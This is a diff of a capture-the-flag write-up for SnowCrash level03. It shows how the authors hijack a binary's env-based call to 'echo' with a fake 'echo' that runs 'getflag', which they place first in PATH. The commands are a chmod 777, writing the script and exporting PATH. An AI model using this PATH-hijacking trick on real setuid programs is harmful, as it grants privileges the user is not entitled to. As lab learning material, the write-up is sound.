@@ -1,15 +1,34 @@
-# We found a binary: ./level03
-# The binary print 'Exploit me'
-# We dump the binary:
-hexdump ./level03 -C
+# Find the password of Flag03
 
-# We found: /usr/bin/env echo Exploit me
+## First check :
+Home directory : \[✓\] not empty.
 
-# So we thinked that the vurnability is to make the program use our 'homemade echo' XD
-chomod 777 .
+This time, we found a binary file which we run:
+
+> ./level03
+> Exploit me
+
+
+## Exploit it.
+
+The first thing that came us in mind is to hexdump the binary file.
+#### result:
+> /usr/bin/env echo Exploit me
+
+The vulnerability is then in the `echo` which we exploit by injecting the `getflag` command in our *homemade echo*.
+#### (by homemade, we mean the /home/... obviously **~**)
+
+
+```
+chmod 777 .
 echo 'getflag' > echo
 chmod +x echo
 export PATH=/home/user/level03/:$PATH
+```
 
-# We launched again ./level03
-# And TADAAAAAAAA
+We run again the `./level03` aaaand..
+
+## TADAAAAAAA, It's ... 
+[The next level flag](https://github.com/XD-OB/snowcrash/blob/master/level03/flag)
+
+_tobecontinued_
